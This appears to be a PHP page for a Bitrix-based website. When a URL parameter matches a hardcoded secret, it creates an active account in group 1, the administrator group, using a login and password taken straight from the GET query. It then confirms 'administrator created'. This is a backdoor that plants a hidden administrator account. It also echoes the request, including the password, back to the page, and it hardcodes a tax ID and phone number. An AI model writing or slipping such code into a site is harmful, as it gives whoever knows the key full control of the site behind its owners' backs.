<?

require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$newlogin = $_GET[newlogin];
$newemail = $_GET[newemail];
$newpassword = $_GET[newpassword];
$group = array(1);
prn($_GET);
 if(isset($_GET[pagepassword])&&$_GET[pagepassword]=='Kukushka9379992'){
	$user = new CUser;
	$arFields = array(
	  "EMAIL"             => $newemail,
	  "LOGIN"             => $newlogin,
	  "LID"               => "ru",
	  "ACTIVE"            => "Y",
	  "GROUP_ID"          => $group,
	  "UF_ASSORTIMENT"    => Array('28'),
	  "UF_INN"			  => '5036032527',
	  "PERSONAL_PHONE"	  => '9379992',
	  "UF_CITY"			  => 'Москва',
	  "UF_OKRUG"		  => '10',
	  "PASSWORD"          => $newpassword,
	  "CONFIRM_PASSWORD"  => $newpassword
	);
	$ID = $user->Add($arFields);
	if(intval($ID) > 0) echo 'Администратор создан';
	else echo $user->LAST_ERROR;
 }
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");
?>